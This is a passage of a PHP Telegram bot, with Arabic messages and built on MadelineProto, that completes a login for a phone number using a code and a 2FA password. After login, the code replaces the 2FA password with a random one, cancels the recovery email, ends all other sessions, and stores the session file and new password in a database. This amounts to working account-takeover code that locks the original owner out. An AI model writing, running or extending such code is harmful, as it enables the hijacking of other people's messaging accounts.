                try {
                    $mad = new API($tempFile, $settings);
                    $newSent = $mad->phoneLogin($phone);
                    $db->prepare("UPDATE activation_sessions SET code_hash=? WHERE admin_id=?")->execute([$newSent['phone_code_hash'], $user_id]);
                    sendMessage($chat_id, fancyMessage('⚠️ كود غير صالح', "⚠️ الكود غير صالح\nتم إرسال كود جديد إلى $phone\nأرسله خلال 60 ثانية", '⚠️'));
                } catch (Exception $e2) {
                    sendMessage($chat_id, fancyMessage('❌ فشل', "فشل إرسال كود جديد: " . $e2->getMessage(), '❌'));
                }
            } else {
                sendMessage($chat_id, fancyMessage('❌ فشل التحقق', "فشل التحقق من الكود: " . $e->getMessage(), '❌'));
            }
        }
        exit;
    }
    
    // ========== استقبال كلمة المرور القديمة (2FA) ==========
    elseif ($session && $session['step'] === 'awaiting_password') {
        $oldPass = $text;
        $serializedFile = $session['serialized_file'] ?? '';
        $mad = loadSerialized($serializedFile);
        
        if (!$mad) {
            sendMessage($chat_id, fancyMessage('❌ خطأ', "خطأ في الجلسة، ابدأ من جديد", '❌'));
            $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
            exit;
        }
        
        try {
            $mad->complete2faLogin($oldPass);
            
            $newPassword = bin2hex(random_bytes(8));
            
            // تغيير كلمة المرور
            try { $mad->update2fa(['password' => $newPassword]); } catch (Exception $e) {}
            
            // إلغاء البريد الإلكتروني
            try { $mad->account->cancelPasswordEmail(); } catch (Exception $e) {}
            
            // إنهاء الجلسات الأخرى
            try { $mad->account->resetAuthorization(); } catch (Exception $e) {}
            
            // تسجيل الخروج
            try { $mad->logout(); } catch (Exception $e) {}
            
            $finalFile = SESSIONS_PATH . md5($session['phone']) . '.madeline';
            $tempFile = $session['temp_file'];
            if (file_exists($tempFile)) rename($tempFile, $finalFile);
            
            $db->prepare("INSERT INTO accounts (phone, country_code, session_file, password, status) VALUES (?,?,?,?,'active')")->execute([$session['phone'], $session['country_code'], $finalFile, $newPassword]);
            $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
            
            sendMessage($chat_id, fancyMessage('🎉 تم التخزين بنجاح', "✅ تم تخزين الحساب\n" . formatPhone($session['phone']) . "\n🔐 كلمة المرور الجديدة: " . formatPassword($newPassword) . "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⚠️ تم تغيير كلمة المرور وإلغاء البريد الإلكتروني", '🎉'));
            
        } catch (Exception $e) {
            sendMessage($chat_id, fancyMessage('❌ كلمة مرور خاطئة', "كلمة المرور غير صحيحة: " . $e->getMessage(), '❌'));
        }
        exit;
    }
    
    else {
        sendMessage($chat_id, fancyMessage('⚠️ تنبيه', "📝 أرسل <code>/start</code> للبدء", '⚠️'));
    }
}
?>